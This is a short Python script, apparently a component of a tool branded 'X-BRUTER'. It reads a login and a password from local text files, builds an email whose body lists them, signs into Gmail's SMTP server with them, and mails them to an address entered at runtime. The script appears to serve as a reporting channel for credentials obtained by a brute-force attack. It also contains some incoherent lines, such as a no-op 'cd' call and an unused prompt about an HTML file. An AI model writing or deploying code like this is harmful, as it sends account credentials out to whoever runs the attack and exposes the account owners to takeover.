import smtplib
import time, os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

recive = input("Enter your mail account login!:")
login = open("login.txt", "r").read()
password = open("password.txt", "r").read()
namemail = ("X-BRUTER") + (" <") + (login) + (">")
# Create message container - the correct MIME type is multipart/alternative.
msg = MIMEMultipart('alternative')
msg['Subject'] = ("Bruter")
msg['From'] = namemail
msg['To'] = recive

text = ""
os.system("cd")
print("Put your html file in X-TOOL Directory")
logs = ("Login: ") + (login) + ("Password: ") + (password)
html = logs

part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')

# Attach parts into message container.
# According to RFC 2046, the last part of a multipart message, in this case
# the HTML message, is best and preferred.
msg.attach(part1)
msg.attach(part2)
# Send the message via local SMTP server.
mail = smtplib.SMTP('smtp.gmail.com', 587)

mail.ehlo()

mail.starttls()

mail.login(login, password)
mail.sendmail(namemail, recive, msg.as_string())
mail.quit()
